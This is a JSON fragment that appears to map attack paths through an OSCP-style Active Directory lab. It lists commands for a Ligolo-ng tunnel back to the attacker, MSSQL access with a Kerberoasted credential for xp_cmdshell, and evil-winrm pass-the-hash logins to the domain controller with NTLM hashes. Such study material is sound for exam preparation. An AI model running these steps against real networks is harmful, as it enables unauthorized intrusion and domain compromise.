  "connections":[
    {
      "from":"ms01","to":"ms02",
      "technique":"Kerberoasting → MSSQL (impacket-mssqlclient)",
      "requires":"sql_svc:Dolphin1 from Kerberoasting on MS01",
      "pivot":"Ligolo-ng tunnel through MS01 to 10.10.x.0/24",
      "path_ids":["path-ad-kerberoast","path-ad-main"],
      "commands":[
        "ligolo-ng agent -connect <kali-ip>:11601 -retry -ignore-cert",
        "session","ifconfig","start --tun ligolo",
        "ip route add 10.10.x.0/24 dev ligolo",
        {"cmd": "impacket-mssqlclient oscp.exam/sql_svc:Dolphin1@10.10.x.148 -windows-auth", "rationale": "Why: Pivot to MSSQL via Kerberoasted sql_svc for xp_cmdshell"}
      ]
    },
    {
      "from":"ms02","to":"dc01",
      "technique":"Pass-the-Hash (Evil-WinRM)",
      "requires":"tom_admin hash from windows.old SAM dump OR Domain Admin hash from Mimikatz",
      "pivot":"Already on internal network via MS01 Ligolo tunnel",
      "path_ids":["path-ad-main","path-ad-kerberoast"],
      "commands":[
        "evil-winrm -i 10.10.x.146 -u tom_admin -H '4979d69d4ca66955c075c41cf45f24dc'",
        "evil-winrm -i 10.10.x.146 -u Administrator -H '59b280ba707d22e3ef0aa587fc29ffe5'"
      ]
